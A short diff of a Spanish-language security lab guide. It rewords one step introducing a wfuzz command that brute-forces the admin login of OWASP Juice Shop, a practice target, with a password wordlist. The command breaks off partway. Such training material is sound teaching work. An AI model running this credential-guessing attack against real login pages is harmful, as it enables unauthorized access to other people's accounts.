@@ -30,7 +30,7 @@ Ctrl+O, Enter, luego Ctrl+X.
 
 Ahora automatizamos el intento de varias contraseñas usando la wordlist que acabáis de crear:
 
-1. En la terminal Kali 2 ejecutad el siguiente comando (ajustad la ruta de la lista si la guardasteis en otro sitio):
+1. En la terminal Kali, ejecutad el siguiente comando (ajustad la ruta de la lista si la guardasteis en otro sitio):
     
     `bashwfuzz -z file,~/admin-passlist.txt \
       -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
